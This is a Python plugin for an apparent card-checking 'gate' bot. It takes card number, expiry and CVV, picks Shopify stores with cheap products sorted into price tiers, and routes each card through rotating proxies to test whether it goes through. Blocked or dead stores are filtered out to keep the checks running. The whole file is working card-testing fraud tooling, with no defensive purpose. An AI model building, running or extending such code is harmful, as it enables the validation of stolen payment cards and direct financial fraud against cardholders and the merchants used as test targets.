# language: Python 3.12+, file: bot/gates/shopify.py, target: Windows 11
# Shopify gate bot plugin — matches SkyBots / storegate.py contract.
# Target pool loaded from PUSTO_SHOPIFY_TARGETS or data/shopify_targets.txt.
# Full price tier support (/sh [1|5|20|low|mid|high] cc).
import asyncio
import json
import os
import random
from pathlib import Path

from curl_cffi.requests import AsyncSession
import gate_client as gc
from shopify_gate import check_target, MAX_PRICE_CENTS

NAME = "shopify"
COST = 2

_sem = asyncio.Semaphore(5)
_health: dict[str, dict] = {}

PRICE_TIERS = {
    "1": (0, 100),         # <= $1
    "5": (101, 500),       # $1.01 - $5
    "20": (501, 2000),     # $5.01 - $20
    "low": (0, 200),       # <= $2
    "mid": (201, 600),     # $2.01 - $6
    "high": (601, 2000),   # $6.01 - $20
}


def parse_tier(token: str) -> tuple[int, int] | None:
    """Parse tier token ('/sh 1 cc...', '/sh low cc...'). Returns (min_cents, max_cents) or None."""
    return PRICE_TIERS.get(str(token).strip().lower())


def _cheapest_map() -> dict[str, int]:
    """domain -> cheapest_cents from data/shopify_gates.json."""
    p = os.path.join(os.path.dirname(__file__), "..", "..", "data", "shopify_gates.json")
    try:
        with open(p, encoding="utf-8") as f:
            gates = json.load(f)
        return {
            g["domain"]: int(g["cheapest_cents"])
            for g in gates
            if g.get("domain") and g.get("cheapest_cents") is not None
        }
    except Exception:
        return {}


def _dead_domains() -> set[str]:
    """Return dead/blocked domains from data/shopify_gates.json."""
    p = os.path.join(os.path.dirname(__file__), "..", "..", "data", "shopify_gates.json")
    try:
        with open(p, encoding="utf-8") as f:
            gates = json.load(f)
        return {
            g.get("domain")
            for g in gates
            if g.get("dead_surface") or g.get("phantom") or g.get("blocked")
        } - {None}
    except Exception:
        return set()


def _targets(tier: tuple[int, int] | None = None) -> list[str]:
    """Load Shopify targets from env or data/shopify_targets.txt, filtering by tier and health."""
    t = os.environ.get("PUSTO_SHOPIFY_TARGETS", "")
    if t:
        targets = [x.strip().rstrip("/") for x in t.split(",") if x.strip()]
    else:
        p = os.path.join(os.path.dirname(__file__), "..", "..", "data", "shopify_targets.txt")
        if not os.path.exists(p):
            return []
        with open(p, encoding="utf-8") as f:
            targets = [ln.strip().rstrip("/") for ln in f if ln.strip().startswith("http")]

    dead = _dead_domains()
    if dead:
        targets = [
            t2 for t2 in targets
            if t2.replace("https://", "").replace("http://", "").rstrip("/") not in dead
        ]

    if tier is not None:
        lo, hi = tier
        cmap = _cheapest_map()
        targets = [
            t2 for t2 in targets
            if cmap.get(t2.replace("https://", "").replace("http://", "").rstrip("/")) is not None
            and lo <= cmap[t2.replace("https://", "").replace("http://", "").rstrip("/")] <= hi
        ]
    return targets


def _pick_target(targets: list[str]) -> str:
    """Select target with weight inversely proportional to measured latency (1/lat_ms)."""
    if not targets:
        raise RuntimeError("No Shopify targets available")
    known = [
        (t, _health[t]["lat_ms"])
        for t in targets
        if t in _health and _health[t].get("lat_ms")
    ]
    if not known:
        return random.choice(targets)

    lats = sorted(l for _, l in known)
    med = lats[len(lats) // 2]
    weights = []
    for t in targets:
        lat = dict(known).get(t)
        weights.append(1.0 / max(lat, 100) if lat else 1.0 / max(med, 100))
    return random.choices(targets, weights=weights, k=1)[0]


def _normalize(cc: str, mm: str, yy: str, cvv: str) -> str | None:
    """Normalize card parameters into canonical CC|MM|YYYY|CVV string with Luhn verification."""
    cc_clean = "".join(ch for ch in str(cc) if ch.isdigit())
    if not (13 <= len(cc_clean) <= 19) or not gc.check_luhn(cc_clean):
        return None
    try:
        month = int(str(mm).strip().lstrip("0") or "0")
    except ValueError:
        return None
    if not (1 <= month <= 12):
        return None
    year = str(yy).strip()
    if len(year) == 2:
        year = "20" + year
    if not (len(year) == 4 and year.isdigit()):
        return None
    return f"{cc_clean}|{month:02d}|{year}|{str(cvv).strip()}"


async def gate(
    cc: str, mm: str, yy: str, cvv: str, tier: str | None = None
) -> tuple[str, str, dict] | tuple[str, str]:
    """Bot gate interface: async gate(cc, mm, yy, cvv, tier=None) -> (verdict, detail, extra)."""
    raw = _normalize(cc, mm, yy, cvv)
    if raw is None:
        return ("INVALID", "bad card format / Luhn fail")

    t_window = parse_tier(tier) if tier else None
    if tier and t_window is None:
        return ("ERROR", f"Unknown price tier '{tier}' (available: 1, 5, 20, low, mid, high)")

    targets = _targets(tier=t_window)
    if not targets:
        return (
            "ERROR",
            f"No Shopify targets in price tier {tier} (check PUSTO_SHOPIFY_TARGETS / data/shopify_targets.txt)",
        )

    max_price = t_window[1] if t_window else MAX_PRICE_CENTS
    async with _sem:
        target = _pick_target(targets)
        proxy_pool = gc.load_proxies()
        proxy = gc.pick_proxy(proxy_pool, None)
        t0 = asyncio.get_event_loop().time()
        try:
            res = await check_target(target, raw, proxy, max_price)
            lat = int((asyncio.get_event_loop().time() - t0) * 1000)
            h = _health.setdefault(target, {"lat_ms": None, "fails": 0})
            h["lat_ms"] = lat
            return (
                res.get("status", "ERROR"),
                f"[{res.get('amount_cents', 0)}c {res.get('currency', 'USD')}] "
                f"{str(res.get('detail', ''))[:160]}",
                {"proxy": proxy, "target": target, "lat_ms": lat},
            )
        except Exception as e:
            h = _health.setdefault(target, {"lat_ms": None, "fails": 0})
            h["fails"] += 1
            return ("ERROR", f"{type(e).__name__}: {e}"[:180])
